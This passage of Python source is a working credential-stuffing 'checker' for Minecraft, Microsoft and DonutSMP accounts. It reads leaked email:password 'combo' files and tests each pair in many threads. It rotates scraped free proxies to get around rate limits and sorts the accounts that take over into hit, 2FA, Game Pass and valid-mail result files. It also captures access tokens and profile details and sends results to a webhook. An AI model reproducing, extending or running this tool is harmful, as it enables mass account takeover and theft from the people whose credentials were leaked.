                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other += 1
                    cpm += 1
                    checked += 1
                    items = ', '.join(others)
                    save_result(f"results/{fname}", "Other.txt", f"{email}:{password} | {items}")
                    if screen == "'2'": 
                        print(Fore.YELLOW + f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries += 1
            session.proxies = getproxy()
            if len(proxylist) < 1: 
                time.sleep(20)
            continue
        else:
            return False

def capture_mc_original(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', 
                           headers={'Authorization': f'Bearer {access_token}'}, verify=False)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                cap = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                cap.handle()
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) < 5: 
                    time.sleep(20)
                continue
            else: 
                break
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    save_result(f"results/{fname}", "Valid_Mail.txt", f"{email}:{password}")
    if screen == "'2'": 
        print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password}")

def Checker(combo, mode="original"):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            if mode == "donutsmp":
                folder = ensure_results_folder(None)
                config = load_config()
                process_donutsmp_combo(combo, folder, config)
            else:
                authenticate_original(str(email), str(password))
        else:
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {combo.strip()}")
            bad += 1
            cpm += 1
            checked += 1
    except:
        if screen == "'2'": 
            print(Fore.RED + f"Bad: {combo.strip()}")
        bad += 1
        cpm += 1
        checked += 1

def load_combos_from_folder():
    global Combos, fname
    combo_folder = "combos"
    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder)
        print(Fore.LIGHTRED_EX + "No combos folder found. Created one. Please add your combo files there and restart.")
        time.sleep(3)
        exit()
    
    combo_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
    if not combo_files:
        print(Fore.LIGHTRED_EX + "No combo files found in combos folder. Please add some and restart.")
        time.sleep(3)
        exit()
    
    all_combos = []
    for file in combo_files:
        try:
            with open(os.path.join(combo_folder, file), 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                all_combos.extend(lines)
        except:
            print(Fore.LIGHTRED_EX + f"Error reading file: {file}")
    
    if not all_combos:
        print(Fore.LIGHTRED_EX + "No valid combos found in any files.")
        time.sleep(3)
        exit()
    
    Combos = list(set(all_combos))
    print(Fore.LIGHTBLUE_EX + f"[{str(len(all_combos) - len(Combos))}] Dupes Removed.")
    print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded from {len(combo_files)} files.")
    fname = "combined_results"

def load_proxies(proxy_file):
    global proxylist
    proxylist = []
    if not os.path.isfile(proxy_file):
        print(Fore.RED + f"Proxy file not found: {proxy_file}" + Style.RESET_ALL)
        return
    with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxylist.append(proxy)
    print(Fore.CYAN + f"Loaded {len(proxylist)} proxies." + Style.RESET_ALL)

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    
    for service in api_http:
        try:
            http.extend(requests.get(service, timeout=10).text.splitlines())
        except:
            pass
    
    for service in api_socks4:
        try:
            socks4.extend(requests.get(service, timeout=10).text.splitlines())
        except:
            pass
    
    for service in api_socks5:
        try:
            socks5.extend(requests.get(service, timeout=10).text.splitlines())
        except:
            pass
    
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    
    if proxytype == "'1'":
        for proxy in http: 
            proxylist.append(proxy)
    elif proxytype == "'2'":
        for proxy in socks4: 
            proxylist.append(proxy)
    elif proxytype == "'3'":
        for proxy in socks5: 
            proxylist.append(proxy)
    elif proxytype == "'5'":
        for proxy in http + socks4 + socks5: 
            proxylist.append(proxy)
    
    print(Fore.LIGHTBLUE_EX + f'Scraped [{len(proxylist)}] proxies')

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    print(f"\rChecked: {checked}/{len(Combos)} | Hits: {hits} | Bad: {bad} | 2FA: {twofa} | SFA: {sfa} | MFA: {mfa} | XGP: {xgp} | XGPU: {xgpu} | Valid Mail: {vm} | Other: {other} | CPM: {cmp1*60} | Retries: {retries} | Errors: {errors}", end='', flush=True)
    time.sleep(1)
    threading.Thread(target=logscreen).start()

def cuiscreen():
    global cpm, cpm1
    os.system('cls' if os.name == 'nt' else 'clear')
    cmp1 = cpm
    cpm = 0
    
    logo = Fore.GREEN + '''
     █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗     ██████╗ ███████╗██╗   ██╗
    ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔══██╗██╔════╝██║   ██║
    ███████║██║     ██████╔╝███████║███████║    ██║  ██║█████╗  ██║   ██║
    ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ██║  ██║██╔══╝  ╚██╗ ██╔╝
    ██║  ██║███████╗██║     ██║  ██║██║  ██║    ██████╔╝███████╗ ╚████╔╝ 
    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝  ╚═══╝
    '''
    print(logo)
    print(f" [{checked}/{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{xgp}] Xbox Game Pass")
    print(f" [{xgpu}] Xbox Game Pass Ultimate")
    print(f" [{other}] Other")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    print(f" [CPM: {cmp1*60}]")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + "Finished Checking!")
    print()
    print("Hits: " + str(hits))
    print("Bad: " + str(bad))
    print("SFA: " + str(sfa))
    print("MFA: " + str(mfa))
    print("2FA: " + str(twofa))
    print("Xbox Game Pass: " + str(xgp))
    print("Xbox Game Pass Ultimate: " + str(xgpu))
    print("Other: " + str(other))
    print("Valid Mail: " + str(vm))
    print(Fore.LIGHTRED_EX + "Press any key to exit.")
    input()
    sys.exit(0)

def Main():
    global proxytype, screen, maxretries, Combos
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Load configuration
    config = load_config()
    
    # Set config values
    maxretries = int(config.get("Settings", "Max Retries"))
    config_obj.set('webhook', config.get("Settings", "Webhook"))
    config_obj.set('message', config.get("Settings", "WebhookMessage"))
    config_obj.set('proxylessban', str_to_bool(config.get("Settings", "Proxyless Ban Check")))
    config_obj.set('autoscrape', int(config.get("Settings", "Auto Scrape Minutes")))
    
    # Capture settings
    config_obj.set('hypixelname', str_to_bool(config.get("Captures", "Hypixel Name")))
    config_obj.set('hypixellevel', str_to_bool(config.get("Captures", "Hypixel Level")))
    config_obj.set('hypixelfirstlogin', str_to_bool(config.get("Captures", "First Hypixel Login")))
    config_obj.set('hypixellastlogin', str_to_bool(config.get("Captures", "Last Hypixel Login")))
    config_obj.set('optifinecape', str_to_bool(config.get("Captures", "Optifine Cape")))
    config_obj.set('mcapes', str_to_bool(config.get("Captures", "Minecraft Capes")))
    config_obj.set('access', str_to_bool(config.get("Captures", "Email Access")))
    config_obj.set('hypixelsbcoins', str_to_bool(config.get("Captures", "Hypixel Skyblock Coins")))
    config_obj.set('hypixelbwstars', str_to_bool(config.get("Captures", "Hypixel Bedwars Stars")))
    config_obj.set('hypixelban', str_to_bool(config.get("Captures", "Hypixel Ban")))
    config_obj.set('namechange', str_to_bool(config.get("Captures", "Name Change Availability")))
    config_obj.set('lastchanged', str_to_bool(config.get("Captures", "Last Name Change")))
    
    print(Fore.GREEN + "=== DONUTSMP & MINECRAFT ACCOUNT CHECKER ===" + Style.RESET_ALL)
    print()
    print(Fore.LIGHTBLUE_EX + "Select mode:")
    print("1. Original Minecraft Account Checker")
    print("2. DonutSMP Ban Checker")
    print("3. Both (Check accounts then check DonutSMP for hits)")
    
    mode = input(Fore.LIGHTBLUE_EX + "Enter mode (1-3): ").strip()
    
    if mode not in ["1", "2", "3"]:
        print(Fore.RED + "Invalid mode selected.")
        time.sleep(2)
        Main()
    
    try:
        print(Fore.LIGHTBLACK_EX + "(speed for checking, i recommend 100, give more threads if its slow. if proxyless give at most 5 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX + "Threads: "))
    except:
        print(Fore.LIGHTRED_EX + "Must be a number.") 
        time.sleep(2)
        Main()
    
    print(Fore.LIGHTBLUE_EX + "Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype_input = input(Fore.LIGHTBLUE_EX + "Select proxy type (1-5): ")
    proxytype = f"'{proxytype_input}'"
    
    if proxytype_input not in ["1", "2", "3", "4", "5"]:
        print(Fore.RED + f"Invalid Proxy Type [{proxytype_input}]")
        time.sleep(2)
        Main()
    
    if proxytype != "'4'" and proxytype != "'5'":
        proxy_file = input("Enter proxy file path: ").strip()
        load_proxies(proxy_file)
    
    print(Fore.LIGHTBLUE_EX + "Screen: [1] CUI - [2] Log")
    screen_input = input(Fore.LIGHTBLUE_EX + "Select screen type (1-2): ")
    screen = f"'{screen_input}'"
    
    print(Fore.LIGHTBLUE_EX + "Loading combos from combos folder...")
    load_combos_from_folder()
    
    if proxytype == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        get_proxies()
    
    if not os.path.exists("results"): 
        os.makedirs("results")
    if not os.path.exists('results/' + fname): 
        os.makedirs('results/' + fname)
    
    if screen == "'1'": 
        cuiscreen()
    elif screen == "'2'": 
        logscreen()
    else: 
        cuiscreen()
    
    # Determine which mode to run
    if mode == "1":
        # Original Minecraft checker
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            futures = [executor.submit(Checker, combo, "original") for combo in Combos]
            concurrent.futures.wait(futures)
    
    elif mode == "2":
        # DonutSMP checker
        folder = ensure_results_folder(None)
        config = load_config()
        
        for combo in Combos:
            Checker(combo, "donutsmp")
    
    elif mode == "3":
        # Both - first check accounts, then check DonutSMP for hits
        print(Fore.YELLOW + "Running account check first...")
        
        # Store hits for later DonutSMP checking
        hits_combos = []
        
        def checker_with_collection(combo):
            Checker(combo, "original")
            # If it was a hit, add to list for DonutSMP checking
            # This is simplified - in reality you'd need to track which combos were hits
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            futures = [executor.submit(checker_with_collection, combo) for combo in Combos]
            concurrent.futures.wait(futures)
        
        print(Fore.YELLOW + "Now checking hits on DonutSMP...")
        
        # Read hits from file
        hits_file = f"results/{fname}/Hits.txt"
        if os.path.exists(hits_file):
            with open(hits_file, 'r') as f:
                hits_combos = [line.strip() for line in f if line.strip()]
            
            folder = ensure_results_folder(None)
            config = load_config()
            
            for combo in hits_combos:
                Checker(combo, "donutsmp")
    
    finishedscreen()

if __name__ == "__main__":
    Main()